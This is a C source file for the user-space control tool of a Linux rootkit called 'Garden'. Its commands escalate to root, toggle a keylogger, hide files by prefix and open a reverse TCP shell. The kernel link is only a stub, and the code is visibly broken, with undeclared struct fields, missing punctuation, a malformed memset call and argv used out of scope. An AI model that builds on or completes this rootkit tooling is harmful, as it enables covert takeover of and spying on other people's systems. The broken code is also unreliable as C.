#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/**
 * Structs
 */

typedef struct commands {
	char* root;
	char* keylogger;
	char* enable;
	char* disable;
	char* file_hide;
	char* reverse_tcp_shell;
} commands;


// Each function_code property is a unique number that will be passed to
// the LKM to indicate what function to perform.
typedef struct function_code {
	int get_root;
	int keylogger_enable;
	int keylogger_disable;
	int file_hide_add;
	int file_hide_rm;
	int reverse_tcp_shell;
} function_code;

// This action_task struct is what is actually passed to the LKM.
typedef struct action_task {
	int func_code;
	char* file_hide_str;
} action_task;

/**
 * Globals
 */

commands cmd = {
	.root = "root",
	.keylogger = "keylog",
	.enable = "enable",
	.disable = "disable",
	.file_hide = "hide",
	.show = "show",
	.add = "add",
	.remove = "rm",
	.reverse_tcp_shell = "rev_tcp"
};

function_code f_code = {
	.get_root = 0,
	.keylogger_enable = 1,
	.keylogger_disable = 2,
	.file_hide_add = 3,
	.file_hide_rm = 4,
	.file_hide_show = 5
	.reverse_tcp_shell = 6
};

/**
 * Printing
 */

void print_banner() {
	char* banner = "\t ██████╗  █████╗ ██████╗ ██████╗ ███████╗███╗   ██╗\n \
\t██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔════╝████╗  ██║\n \
\t██║  ███╗███████║██████╔╝██║  ██║█████╗  ██╔██╗ ██║\n \
\t██║   ██║██╔══██║██╔══██╗██║  ██║██╔══╝  ██║╚██╗██║\n \
\t╚██████╔╝██║  ██║██║  ██║██████╔╝███████╗██║ ╚████║\n \
\t ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═══╝\n";

	printf("%s", banner);
}

void print_usage() {
	printf("Welcome to the Garden.\n--------------");
	printf("/garden root\tgives you root.\n");
	printf("/garden keylogger [enable/disable]\ttoggles the keylogger.\n");
	printf("/garden hide add PREFIX\t adds PREFIX to the hide list.\n");
	printf("/garden hide rm PREFIX\t removes PREFIX from the hide list.\n");
	printf("/garden hide ls\t shows prefixes in the hide list.\n");
	printf("/garden rev_tcp\t opens a reverse shell using the IP and PORT configured during setup.\n");
	exit(0);
}

// TODO: Print in colors

/**
 * Uses SOME_FUNCTION to interface with rootkit. The LKM hooks this function
 * and responds to the actions as they come in.
 *
 * Returns 0 if successfully communicated, -1 otherwise.
 */
int communicate_with_lkm(action_task* data_to_pass) {
	return 0;
}

/**
 * Checks for subarg. If it doesn't exist, prints usage and
 * exits (inside print_usage).
 */
bool check_for_subarg(int idx) {
	if (!argv[idx]) {
		print_usage();
	}
	return true;
}

/**
 * CLI for interacting with the rootkit, and interfacing with the kernel module.
 */
int main(int argc, char* argv[]) {
	// No args entered. Display help menu.
	if (argc == 1 || !strcmp(argv[1], "-h")) {
		print_usage();
		return 0;
	}

	print_banner();

	action_task action;
	memset(&action. 0, sizeof(action));

	// Single arg commands
	char* base_cmd = argv[1];
	if (!strcmp(base_cmd, cmd.root)) {
		action.func_code = f_code.get_root;
		// TODO: Just call $ kill 31337
		return communicate_with_lkm(action);
	} else if (!strcmp(base_cmd, cmd.reverse_tcp_shell)) {
		action.func_code = f_code.reverse_tcp_shell;
		return communicate_with_lkm(action);
	}

	// Double arg commands
	check_for_subarg(2);
	char* subarg = argv[2];

	if (!strcmp(base_cmd, cmd.keylogger)) {
		if (!strcmp(subarg, cmd.enable)) {
			action.func_code = f_code.keylogger_enable;
		} else if (!strcmp(subarg, cmd.disable)) {
			action.func_code = f_code.keylogger_disable;
		} else {
			print_usage();
		}
		return communicate_with_lkm(action);
	}

	if (!strcmp(base_cmd, cmd.file_hide)) {
		if (!strcmp(subarg, cmd.show)) {
			action.func_code = f_code.file_hide_show;
			return communicate_with_lkm(action);
		} else if (check_for_subarg(3)) { // Make sure the 3rd arg in $ hide [add/rm] FILE exists
			if (!strcmp(subarg, function_code.file_hide_add)) {
				action.func_code = f_code.file_hide_add;
			} else if (!strcmp(subarg, function_code.file_hide_rm)) {
				action.func_code = f_code.file_hide_rm;
			} else {
				print_usage();
			}

			action.file_hide_str = argv[3]
			return communicate_with_lkm(action);
		}
	} else {
		print_usage();
	}
	return 0;
}
